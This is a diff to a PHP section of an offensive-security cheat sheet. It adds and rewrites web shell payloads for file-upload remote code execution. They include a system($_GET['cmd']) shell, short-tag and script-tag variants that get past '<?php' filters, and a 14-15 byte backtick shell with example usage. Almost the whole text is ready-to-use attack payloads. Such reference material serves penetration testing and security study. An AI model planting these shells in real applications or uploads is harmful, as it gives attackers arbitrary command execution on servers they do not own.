@@ -4,24 +4,26 @@ description: Some tricks specific to the PHP web programming language
 
 # PHP
 
-## Shell Upload
+## Shell Upload (RCE)
 
 ```php
 <?php system($_GET["cmd"]) ?>
 ```
 
-Bypass `<?php` with `<?=`:
+Bypass `<?php` with alternative prefixes:
 
-```php
-<?= system($_GET["cmd"]) ?>
-```
+<pre class="language-php"><code class="lang-php"><strong>&#x3C;?= system($_GET["cmd"]) ?>  // Universal (echo's result automatically)
+</strong>
+<strong>&#x3C;?system($_GET["cmd"])?>  // Supported on some servers
+</strong>
+<strong>&#x3C;script language="php">system($_GET["cmd"])&#x3C;/script>  // PHP &#x3C; 7
+</strong></code></pre>
 
-<pre class="language-php" data-title="Shortest"><code class="lang-php"><strong>&#x3C;?=`$_GET[0]`;
+<pre class="language-php" data-title="Shortest (14-15 bytes)"><code class="lang-php">// Execute with /shell.php?0=id
+<strong>&#x3C;?=`$_GET[0]`;
 </strong>
 <strong>&#x3C;?=`$_GET[0]`?>ANYTHING
-</strong>
-// Use /shell.php?0=id
-</code></pre>
+</strong></code></pre>
 
 ### .htaccess
 
